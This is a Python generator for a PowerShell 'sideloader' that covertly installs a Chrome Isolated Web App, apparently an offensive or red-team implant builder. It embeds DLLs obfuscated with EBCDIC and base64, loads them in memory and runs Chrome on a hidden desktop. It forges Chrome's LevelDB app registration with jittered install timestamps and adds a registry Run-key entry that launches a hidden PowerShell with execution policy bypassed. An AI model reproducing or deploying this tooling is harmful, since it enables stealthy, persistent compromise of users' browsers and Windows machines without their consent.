import os
import sys
import json
import base64
import argparse
import re
from datetime import datetime
import random
import uuid
from reference.bundleParser import parse_signed_web_bundle_header, extract_manifest_from_bundle
from reference.getAppId import create_web_bundle_id_from_public_key, get_chrome_app_id
from reference.protobufUpdater import parse_protobuf, update_with_origin
import binascii

IWA_APP_NAME = "DOORKNOB"

def generate_protobuf(bundle_path):
    """Generate protobuf data using information from manifest and bundle."""
    # Read manifest from bundle
    manifest = extract_manifest_from_bundle(bundle_path)
    APP_NAME = manifest['name']
    VERSION = manifest['version']
    
    # Parse bundle to get signature and public key
    bundle_info = parse_signed_web_bundle_header(bundle_path)
    PUBLIC_KEY = bundle_info['public_key']
    SIGNATURE_INFO = bundle_info['signature']
    
    # Generate IDs from public key
    web_bundle_id = create_web_bundle_id_from_public_key(base64.b64decode(PUBLIC_KEY))
    ORIGIN = f"isolated-app://{web_bundle_id}"
    APP_ID = get_chrome_app_id(PUBLIC_KEY)
    
    # Generate other required values
    INSTALL_TIME = int(datetime.now().timestamp())
    IWA_FOLDER_NAME = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    
    # Print information
    print("Generated values:")
    print(f"APP_NAME: {APP_NAME}")
    print(f"VERSION: {VERSION}")
    print(f"ORIGIN: {ORIGIN}")
    print(f"APP_ID: {APP_ID}")
    print(f"PUBLIC_KEY: {PUBLIC_KEY}")
    print(f"SIGNATURE_INFO: {SIGNATURE_INFO}")
    print(f"IWA_FOLDER_NAME: {IWA_FOLDER_NAME}")
    
    # Read template protobuf
    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = os.path.join(script_dir, "reference", "app.pb")
    with open(template_path, 'rb') as f:
        template_data = f.read()
    
    # Parse and update protobuf
    message = parse_protobuf(template_data)
    
    # Convert string values to bytes for length-delimited fields
    def to_bytes(s: str) -> bytes:
        return s.encode('utf-8')
    
    # Track jitter count for field 59.1.3.2
    jitter_count = 0
    def add_jitter(base_time: int, _) -> int:
        nonlocal jitter_count
        jitter_count += 1
        return base_time + jitter_count + random.randint(5, 10)
    
    # Perform field updates
    updates = [
        ([1, 1], to_bytes(f"{ORIGIN}/")),
        ([1, 2], to_bytes(APP_NAME)),
        ([1, 5], to_bytes(f"{ORIGIN}/")),
        ([1, 6, 2], ORIGIN, update_with_origin),
        ([2], to_bytes(APP_NAME)),
        ([6], to_bytes(f"{ORIGIN}/")),
        ([10, 2], ORIGIN, update_with_origin),
        ([16], INSTALL_TIME),
        ([30], ORIGIN, update_with_origin),
        ([49, 2], to_bytes(ORIGIN)),
        ([59, 1, 3, 2], INSTALL_TIME, add_jitter),
        ([59, 1, 1], to_bytes(APP_NAME)),
        ([59, 5, 2], to_bytes(APP_NAME)),
        ([60, 1, 1], to_bytes(IWA_FOLDER_NAME)),
        ([60, 6], to_bytes(VERSION)),
        ([60, 7, 1, 1, 1], to_bytes(PUBLIC_KEY)),
        ([60, 7, 1, 1, 2], to_bytes(SIGNATURE_INFO)),
        ([64], INSTALL_TIME),
    ]
    
    for field_path, value, *transform in updates:
        message.update_field(field_path, value, transform[0] if transform else None)
    
    # Serialize
    serialized = message.serialize()
    hex_output = binascii.hexlify(serialized).decode('ascii')
    
    return hex_output, APP_ID, IWA_FOLDER_NAME

def encode_dll_to_ebcdic_base64(file_path):
    """
    Reads a DLL file, encodes it using EBCDIC encoding, then base64 encodes it.
    
    Args:
        file_path: Path to the DLL file
        
    Returns:
        Base64 encoded string of the EBCDIC encoded DLL
    """
    try:
        # Check if file exists
        if not os.path.exists(file_path):
            print(f"Error: File not found at {file_path}", file=sys.stderr)
            return None
            
        # Read the binary content of the DLL
        with open(file_path, 'rb') as file:
            dll_bytes = file.read()
        
        # Convert binary to EBCDIC encoding
        # Using cp037 which is the Python codec for EBCDIC (US/Canada)
        ebcdic_encoded = dll_bytes.decode('latin-1').encode('cp037')
        
        # Base64 encode the EBCDIC encoded bytes
        base64_encoded = base64.b64encode(ebcdic_encoded).decode('ascii')
        
        return base64_encoded
        
    except Exception as e:
        print(f"Error: {str(e)}", file=sys.stderr)
        return None

def generate_powershell_script(bundle_path, output_path, app_name=None):
    """Generate the PowerShell sideloader script."""
    # Use provided app_name if available, otherwise use default
    global IWA_APP_NAME
    if app_name:
        IWA_APP_NAME = app_name
        print(f"Using custom app name: {IWA_APP_NAME}")
    
    # Read the bundle file as base64
    with open(bundle_path, 'rb') as f:
        bundle_data = base64.b64encode(f.read()).decode('ascii')
    
    # Generate protobuf and get required values
    protobuf_hex, app_id, iwa_folder_name = generate_protobuf(bundle_path)
    
    # Generate a GUID for the desktop name
    desktop_guid = str(uuid.uuid4())
    
    # Read the template files
    script_dir = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(script_dir, 'initializeIWAChrome.ps1'), 'r') as f:
        init_script = f.read()
    with open(os.path.join(script_dir, 'writeLevelDb.ps1'), 'r') as f:
        leveldb_script = f.read()
    
    # Read the HiddenDesktopNative DLL and encode as base64
    dll_path = os.path.join(script_dir, 'HiddenDesktopNative', 'dist', 'ProcessHelper.dll')
    with open(dll_path, 'rb') as f:
        dll_data = encode_dll_to_ebcdic_base64(dll_path)
    
    # Read the RegHelper DLL and encode as base64
    reghelper_dll_path = os.path.join(script_dir, 'RegHelper', 'dist', 'RegHelper.dll')
    with open(reghelper_dll_path, 'rb') as f:
        reghelper_dll_data = encode_dll_to_ebcdic_base64(reghelper_dll_path)
    
    # Read the memory DLL loader script
    with open(os.path.join(script_dir, 'decodeAndLoadModule.ps1'), 'r') as f:
        module_loader_script = f.read()

    # Read the Chrome IWA Start Script
    with open(os.path.join(script_dir, 'startIWAApp.ps1'), 'r') as f:
        start_script = f.read()


    # Create the combined script
    script = f"""
# Generated IWA Sideloader Script
# App ID: {app_id}
# App Name: {IWA_APP_NAME}
# IWA Folder: {iwa_folder_name}

$env:APP_NAME = "{IWA_APP_NAME}"

$bundleData = @"
{bundle_data}
"@

# Extract the ProcessHelper.dll to the current directory
$assemblyName = "ProcessHelper"
$assemblyBytesBase64 = @"
{dll_data}
"@

# RegHelper.dll data for registry operations
$regHelperAssemblyBytesBase64 = @"
{reghelper_dll_data}
"@

# Create Directory at $appPath
$appPath = Join-Path $env:LOCALAPPDATA $env:APP_NAME
New-Item -Path $appPath -ItemType Directory -Force

# Include the module loader script
{module_loader_script}

# Use a shared desktop name for both Chrome instances
$sharedDesktopName = "Desktop_{desktop_guid}"
Write-Host "Using shared hidden desktop: $sharedDesktopName"

# Call the function to decode and load the ProcessHelper module
$dllPath = Join-Path $appPath "ProcessHelper.dll"
$moduleLoaded = Decode-And-Load-Module -assemblyBytesBase64 $assemblyBytesBase64 -dllPath $dllPath

if (-not $moduleLoaded) {{
    Write-Error "Failed to load the ProcessHelper module. Exiting."
    exit 1
}}

# Decode and load the RegHelper module
$regHelperDllPath = Join-Path $appPath "RegHelper.dll"
$regHelperModuleLoaded = Decode-And-Load-Module -assemblyBytesBase64 $regHelperAssemblyBytesBase64 -dllPath $regHelperDllPath

if (-not $regHelperModuleLoaded) {{
    Write-Error "Failed to load the RegHelper module. Exiting."
    exit 1
}}

# First initialize Chrome with IWA settings
{init_script}

# Then handle LevelDB operations
{leveldb_script}

# Move ProcessHelper.dll to the app directory
Move-Item -Path $dllPath -Destination $appPath

# Move RegHelper.dll to the app directory  
Move-Item -Path $regHelperDllPath -Destination $appPath

# Override Initialize-IWADirectory to use embedded bundle data
function Initialize-IWADirectory {{
    param (
        [Parameter(Mandatory=$true)]
        [string]$AppInternalName
    )
    
    $userDataDir = Join-Path $env:LOCALAPPDATA $env:APP_NAME
    $iwaDir = Join-Path $userDataDir "Default\\iwa\\$AppInternalName"
    
    # Create directories if they don't exist
    New-Item -ItemType Directory -Force -Path $iwaDir | Out-Null
    
    # Write bundle data
    $bundleBytes = [Convert]::FromBase64String($bundleData)
    [System.IO.File]::WriteAllBytes((Join-Path $iwaDir "main.swbn"), $bundleBytes)
}}

# Initialize IWA directory
Initialize-IWADirectory -AppInternalName "{iwa_folder_name}"

# Write LevelDB entry
$logPath = Get-LevelDBLogFilePath
Write-Output "Log Path: $logPath"
Write-LevelDBEntry -FilePath $logPath -SequenceNumber 99 -Key "web_apps-dt-{app_id}" -ValueHex "{protobuf_hex}"

Write-Output "Launching Chrome for IWA ({app_id}) at Path $env:CHROME_PATH"
$env:IWA_APP_ID = "{app_id}"

# Prepare the start script with proper variable handling
$startScriptPath = Join-Path $env:LOCALAPPDATA $env:APP_NAME
$startScriptPath = Join-Path $startScriptPath "startIWAApp.ps1"

# Create the script content as a simple string
$startScriptContent = "# Environment variables for IWA app `n"
$startScriptContent += "`$env:CHROME_PATH = `"$env:CHROME_PATH`" `n"
$startScriptContent += "`$env:USER_DATA_DIR = `"$env:USER_DATA_DIR`" `n"
$startScriptContent += "`$env:APP_NAME = `"$env:APP_NAME`" `n"
$startScriptContent += "`$env:IWA_APP_ID = `"$env:IWA_APP_ID`" `n"
$startScriptContent += "`$sharedDesktopName = `"$sharedDesktopName`" `n"
$startScriptContent += "`n# Start script content`n"
$startScriptContent += @'
{start_script}
'@

Write-Host "Writing start script to: $startScriptPath"
[System.IO.File]::WriteAllText($startScriptPath, $startScriptContent)

# Now run the start script
Write-Host "Running the IWA app..."
& $startScriptPath

# Setup persistence using the RegHelper module
Write-Host "`nSetting up persistence using copy-and-replace registry strategy..." -ForegroundColor Cyan

# Define persistence parameters
$persistenceValueName = "{IWA_APP_NAME}.Updater"
$persistenceValueData = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$startScriptPath`""

# Execute the persistence setup using the RegHelper module
try {{
    Invoke-RegistryPersistence -PersistenceValueName $persistenceValueName -PersistenceValueData $persistenceValueData
}} catch {{
    Write-Error "Failed to setup persistence: $($_.Exception.Message)"
    throw
}}
"""
    
    with open(output_path, 'w') as f:
        f.write(script)
    
    print(f"\nGenerated sideloader script: {output_path}")
    print(f"Using shared desktop name: Desktop_{desktop_guid}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('bundle_path', help='Path to the .swbn bundle file')
    parser.add_argument('--output', help='Output path for the sideloader script')
    parser.add_argument('--appname', help='Override the default IWA app name (default: DOORKNOB)')
    args = parser.parse_args()
    
    try:
        # Validate bundle path
        if not os.path.exists(args.bundle_path):
            raise FileNotFoundError(f"Bundle file not found: {args.bundle_path}")
        
        # Generate default output path if not specified
        if not args.output:
            bundle_name = os.path.splitext(os.path.basename(args.bundle_path))[0]
            args.output = f"{bundle_name}-sideloader.ps1"
        
        generate_powershell_script(args.bundle_path, args.output, args.appname)
        
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main() 